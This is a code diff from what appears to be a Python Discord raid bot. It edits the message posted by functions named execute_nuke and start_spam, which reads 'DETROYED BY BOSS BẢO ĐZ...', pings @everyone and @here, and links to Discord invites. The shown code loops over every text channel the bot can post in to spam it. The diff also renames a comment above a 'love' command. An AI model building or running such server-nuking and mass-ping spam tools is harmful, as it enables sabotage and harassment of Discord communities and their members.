@@ -439,8 +439,7 @@ async def execute_nuke(guild):
             "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
-            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
+            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
         )
 
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
@@ -602,8 +601,7 @@ async def start_spam(ctx):
             "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
-            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
+            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
         )
         while is_spamming:
             channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
@@ -2601,7 +2599,7 @@ GIF_LOVE = [
     "https://media.tenor.com/2k4z1C2d5zIAAAAM/love.gif",
 ]
 
-# ==================== LỆNH TÌNH YÊU & TƯƠNG TÁC ====================
+# ==================== LỆNH TÌNH YÊU ====================
 @bot.command(name="love", aliases=["tinhyeu"])
 async def love(ctx, user1: discord.Member = None, user2: discord.Member = None):
     if user1 is None:
